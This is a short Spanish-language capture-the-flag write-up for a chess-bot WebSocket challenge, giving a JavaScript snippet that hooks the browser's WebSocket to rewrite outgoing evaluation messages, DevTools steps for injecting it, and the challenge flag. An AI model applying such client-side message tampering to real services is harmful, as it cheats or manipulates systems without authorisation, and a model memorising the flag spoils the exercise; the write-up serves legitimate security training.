## Descripción

Can you win in a convincing manner against this chess bot? He won't go easy on you! You can find the challenge [here](http://xebec.cylabacademy.net:12132/). 1 Try understanding the code and how the websocket client is interacting with the server

## Solución

```
const OriginalWebSocket = window.WebSocket;
window.WebSocket = function(url, protocols) {
  const ws = new OriginalWebSocket(url, protocols);
  const originalSend = ws.send.bind(ws);
  ws.send = function(data) {
    console.log("ENVIANDO ORIGINAL:", data);
    if (typeof data === "string" && data.startsWith("eval")) {
      data = "eval -1300000000";
      console.log("ENVIANDO MODIFICADO:", data);
    }
    originalSend(data);
  };
  ws.addEventListener("message", (e) => {
    console.log("RECIBIDO:", e.data);
  });
  return ws;
};
```

```
academy{cl13nt_s1d3_w3b_s0ck3t5_c8e7db95}
```

el titulo nos da dos pistas WebSocket que es un protocolo y stockfish que nos da la pista de una aplicacion de ajedrez tal vez en tiempo real o en el backend Vamos a abrir la opcion de inspeccionar elemento y vamos a buscar la linea donde esta el webSocket para buscar la linea exacta de ejecucion nos vamos a la pestana Source y damos `Ctrl+Shift+F` damos doble click a el resultado y con ello nos mandara a la linea exacta ahora damos click en el numero de la linea para que se ponga azul asi creamos un breackpoint cuando recarguemos la pagina ahi se quedara el codigo, rapidamente depues de recargar la pagina vamos a la pestana de consola y pegamos este codigo

const OriginalWebSocket = window.WebSocket; window.WebSocket = function(url, protocols) { const ws = new OriginalWebSocket(url, protocols); const originalSend = ws.send.bind(ws); ws.send = function(data) { console.log("ENVIANDO ORIGINAL:", data); if (typeof data === "string" && data.startsWith("eval")) { data = "eval -1300000000"; console.log("ENVIANDO MODIFICADO:", data); } originalSend(data); }; ws.addEventListener("message", (e) => { console.log("RECIBIDO:", e.data); }); return ws; };

despues de pegarlo damos enter y rapidamente volvemos a la pestana de source y damos play o a lo que aparezca cerca para resumir el codigo y termine al fin de ejecutarlo, si funciono nadamas movemos una pieza y el pescadito deberia darnos la bandera.
## Notas adicionales

## Referencias

https://medium.com/@ahmed_sa3ed/ctf-day-22-e303ac9df89b